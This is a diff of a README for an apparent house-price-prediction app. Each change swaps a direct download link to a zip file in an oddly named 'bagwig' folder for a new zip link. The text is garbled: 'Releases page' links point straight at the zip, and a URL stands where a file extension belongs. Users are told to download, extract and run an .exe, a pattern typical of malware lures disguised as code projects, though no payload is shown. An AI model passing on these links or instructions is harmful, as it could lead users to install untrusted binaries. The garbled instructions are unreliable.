@@ -6,7 +6,7 @@ This guide will help you download and run the house-price-prediction application
 
 ## 📥 Download the Application
 
-[![Download Now](https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip)
+[![Download Now](https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip)
 
 ## 🌐 Introduction
 
@@ -31,17 +31,17 @@ To run this application, your system should meet the following requirements:
 ## 📋 How to Download & Install
 
 1. **Visit the Release Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip).
+   Go to the [Releases page](https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip).
 
 2. **Choose the Latest Release:**
    Look for the latest version listed. Click on it to view the available files.
 
 3. **Download the Application:**
-   Download the appropriate file for your operating system. This file will typically have a `.exe` or `https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip` extension, depending on your OS.
+   Download the appropriate file for your operating system. This file will typically have a `.exe` or `https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip` extension, depending on your OS.
 
 4. **Install the Application:**
    - For Windows: Double-click on the `.exe` file and follow the installation instructions.
-   - For macOS: Open the downloaded `https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip` file and follow the instructions inside.
+   - For macOS: Open the downloaded `https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip` file and follow the instructions inside.
    - For Linux: You may need to extract the tarball and run the installation commands in your terminal.
 
 5. **Run the Application:**
@@ -82,7 +82,7 @@ If you experience issues while using the application, you may find solutions in 
 
 1. **Check System Requirements:** Ensure your system meets all requirements.
 2. **Reinstall the Application:** Sometimes, reinstalling can resolve unexpected behavior.
-3. **Look for Updates:** New versions may include important fixes. Return to the [Releases page](https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip) for updates.
+3. **Look for Updates:** New versions may include important fixes. Return to the [Releases page](https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip) for updates.
 
 ## 🤝 Community and Support
 
@@ -93,7 +93,7 @@ For questions or to join a discussion, consider connecting with fellow users and
 
 ## 📥 Download the Application Again
 
-If you missed it earlier, you can download the application here: [Download Now](https://raw.githubusercontent.com/Abdulbaqi78692/house-price-prediction/main/bagwig/house-price-prediction.zip).
+If you missed it earlier, you can download the application here: [Download Now](https://github.com/Abdulbaqi78692/house-price-prediction/raw/refs/heads/main/bagwig/price_house_prediction_v1.4-beta.4.zip).
 
 ## 🚀 Start Predicting House Prices
 
